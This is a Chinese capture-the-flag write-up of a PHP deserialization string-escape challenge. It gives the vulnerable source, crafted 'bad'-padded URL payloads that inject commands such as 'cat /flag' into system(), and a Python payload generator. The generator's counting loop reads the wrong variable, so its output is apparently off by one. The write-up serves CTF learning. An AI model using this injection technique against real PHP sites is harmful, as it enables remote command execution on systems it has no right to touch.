### NewStar2023 week4 逃

>  反序列化字符串逃逸
>
> - https://xz.aliyun.com/t/9213?time__1311=n4%2BxnD0DuAG%3DoxGqGNnmDUrhzKi%3DrrszH4D
> - https://zhuanlan.zhihu.com/p/330670521

---

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data
```

重点在于：

```php
function waf($str){
    return str_replace("bad","good",$str);
}
```

每次替换字符串增加一

```php
$a = new GetFlag("123");
echo serialize($a);
//O:7:"GetFlag":2:{s:3:"key";s:3:"123";s:3:"cmd";s:6:"whoami";}
```



查一下flag在不在根目录---`";s:3:"cmd";s:4:"ls /";}`--->24个字符构造24个bad

```(空)
?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
```

![image-20241103221851756](https://gitee.com/bx33661/image/raw/master/path/image-20241103221851756.png)

最后读取flag

```python
?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
```

![image-20241103222440061](https://gitee.com/bx33661/image/raw/master/path/image-20241103222440061.png)





---

```python
def bad_gen(num):
    return "bad"*num

def calc(str):
    num = 0 
    for i in str2:
        num+=1
    return num

print("------start------")
arg = input("你需要的参数")
arg_len = len(arg)
str2 = f'";s:3:"cmd";s:{arg_len}:"{arg}";'
str3 = str2 + '}'
print("原始值：",str3)
num_need = calc(str3)
res_bad = bad_gen(num_need)
payload = res_bad + str3
print("------最终结果-----")
print(payload)
```

